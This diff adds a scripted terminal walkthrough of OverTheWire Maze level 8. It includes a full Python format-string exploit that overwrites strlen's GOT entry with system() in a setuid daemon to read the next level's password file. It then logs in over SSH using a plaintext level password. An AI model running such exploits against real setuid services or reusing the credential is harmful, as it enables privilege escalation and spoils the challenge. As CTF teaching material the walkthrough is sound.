@@ -1,0 +1,68 @@
+@sleep 1
+id
+echo '# Maze L8: /maze/maze8 (setuid maze9) is a network password daemon:'
+ls -la /maze/maze8
+objdump -d -M intel /maze/maze8 | grep -A6 '<main>:' | head -12
+objdump -d -M intel /maze/maze8 | grep -B2 -A8 'call   8049120 <snprintf@plt>'
+echo '# the child: recv 0x1ff into ebp-0x230, then snprintf(errbuf, 0x200, INPUT)'
+echo '# - THE INPUT IS THE FORMAT STRING (no 4th arg). Format-string bug!'
+objdump -R /maze/maze8 | grep strlen
+echo '# strlen@GOT = 0x0804b288; after snprintf the child calls strlen(errbuf):'
+echo '# overwrite strlen@GOT with system@libc (ASLR off: 0xf7d6d000+0x53ce0) ->'
+echo '# strlen(errbuf) = system(errbuf) runs as euid maze9 (setreuid(euid,euid)).'
+echo '# Writing the exploit (heredoc, code visible):'
+@line cat > /run/screen/l8/exp.py <<'PYEOF'
+@line import socket, subprocess, time, struct, sys
+@line 
+@line GOT_STRLEN = 0x0804b288
+@line SYSTEM = 0xf7d6d000 + 0x53ce0        # libc base (ASLR off) + system offset
+@line CMD = b"\ncat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\n"
+@line 
+@line def build_payload(target):
+@line     b = [(target >> (8*i)) & 0xff for i in range(4)]
+@line     cur = len(CMD)                   # the printed-char total includes the text
+@line     seq = []
+@line     remaining = list(enumerate(b))
+@line     while remaining:
+@line         best = min(remaining, key=lambda w: (w[1]-cur) % 256)
+@line         seq.append((best[1], GOT_STRLEN+best[0], (best[1]-cur) % 256))
+@line         cur = best[1]
+@line         remaining.remove(best)
+@line     fmt = CMD
+@line     offs = []
+@line     off = 152                        # pointer slots start here (4-aligned)
+@line     for byte, addr, delta in seq:
+@line         k = 134 + off // 4           # vararg N for buf offset o: N = 134 + o/4
+@line         fmt += (b"%" + str(delta).encode() + b"c" if delta else b"%c")
+@line         fmt += b"%" + str(k).encode() + b"$hhn"
+@line         offs.append((off, addr))
+@line         off += 4
+@line     p = fmt + b"\x00"
+@line     for o, addr in offs:
+@line         p = p.ljust(o, b"\x00") + struct.pack("<I", addr)
+@line     assert len(p) <= 511
+@line     return p
+@line 
+@line subprocess.Popen(["/maze/maze8", "31337"],
+@line                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+@line time.sleep(1)
+@line s = socket.create_connection(("127.0.0.1", 31337), timeout=8)
+@line s.recv(100)
+@line s.sendall(build_payload(SYSTEM))
+@line time.sleep(2)
+@line s.close()
+@line print("payload fired; result file:")
+@line PYEOF
+rm -f /tmp/o9; python3 /run/screen/l8/exp.py
+cat /tmp/o9
+echo '# Verify by logging in as maze9 from the CLIENT (localhost logins are blocked):'
+@sleep 1
+exit
+@sleep 2
+ssh -o StrictHostKeyChecking=accept-new maze9@maze.labs.overthewire.org -p 2225
+@waitfor password: bmMHy7DM3E
+@wait 6 id
+@wait 6 cat /etc/maze_pass/maze9
+@wait 6 exit
+@sleep 1
+exit
